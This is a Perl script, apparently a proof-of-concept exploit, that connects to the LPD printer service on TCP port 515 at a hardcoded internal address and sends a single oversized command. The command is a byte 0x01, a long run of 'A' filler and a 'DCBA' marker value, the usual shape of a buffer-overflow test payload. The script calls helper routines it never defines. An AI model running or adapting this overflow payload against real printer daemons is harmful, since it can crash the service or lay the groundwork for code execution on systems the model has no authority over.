#!/usr/bin/perl
 
 
 
use Getopt::Std;
use IO::Socket::INET;
 
$SIG{INT}  = \&abort;
 
my $host  = '10.102.3.79';
my $port  = 515;
my $proto = 'tcp';
my $sockType = SOCK_STREAM;
my $timeout = 1;
 
 
my %opt;
my $opt_string = 'hH:P:t:';
getopts( "$opt_string", \%opt );
 
if (defined $opt{h}) {
    usage()
}
 
my @commands = (
{Command => 'Send',
 Data => "\x01\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x44\x43\x42\x41\x0a"},
 
);
 
my $sock = new IO::Socket::INET (  
                PeerAddr => $host,
                        PeerPort => $port,
                        Proto => $proto,
                Type => $sockType,
                Timeout => $timeout,
            )
    or die "socket error: $!\n\n";
 
print "connected to: $host:$port\n";
 
$sock->autoflush(1);
binmode $sock;
 
 
foreach my $command (@commands)
{
    if ($command->{'Command'} eq 'Receive')
    {
        my $buf = receive($sock, $timeout);
        if (length $buf)
        {
            print "received: [$buf]\n";
        }
    }
    elsif ($command->{'Command'} eq 'Send')
    {
        print "sending: [".$command->{'Data'}."]\n";
        send ($sock, $command->{'Data'}, 0) or die "send failed, reason: $!\n";
    }
}
 
 
close ($sock);
